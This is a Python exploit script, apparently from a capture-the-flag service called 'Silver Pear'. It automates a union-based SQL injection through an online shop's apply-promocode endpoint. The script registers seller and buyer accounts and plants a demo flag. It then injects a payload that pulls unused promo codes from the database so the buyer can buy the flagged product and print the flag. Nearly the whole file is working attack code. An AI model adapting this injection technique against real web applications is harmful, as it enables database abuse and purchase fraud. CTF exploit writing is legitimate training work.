from __future__ import annotations

import argparse
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parents[1]
CHECKER = ROOT / "checker"
if str(CHECKER) not in sys.path:
    sys.path.insert(0, str(CHECKER))

from common import create_product_with_flag, register_and_login


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit Silver Pear union-based SQLi in apply-promocode")
    parser.add_argument("target", nargs="?", default="http://127.0.0.1:7777")
    parser.add_argument("--flag", default="FLAG{demo_promocode_sqli}")
    parser.add_argument("--price", type=int, default=4300)
    args = parser.parse_args()

    seller, seller_name, _ = register_and_login(args.target, prefix="v4_seller", role="seller")
    created = create_product_with_flag(seller, args.flag, price=args.price, title_prefix="V4")
    product_id = int(created["product"]["id"])
    slot = created["note_slot"]

    attacker, username, _ = register_and_login(args.target, prefix="sqli", role="buyer")
    user_id = int(attacker.me()["buyer"]["id"])
    order = attacker.create_order()["order"]
    order = attacker.add_order_item(order["public_id"], product_id)["order"]
    payload = (
        "x' UNION SELECT id, code, 100, is_one_time "
        f"FROM promocode WHERE owner_id = {user_id} AND used_by IS NULL AND '1'='1"
    )
    order = attacker.apply_promocode(order["public_id"], payload)["order"]
    notes = attacker.get_notes(product_id)[1]["notes"]

    print(f"username={username}")
    print(f"seller={seller_name}")
    print(f"payload={payload}")
    print(f"order_status={order['status']}")
    print(notes[slot])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
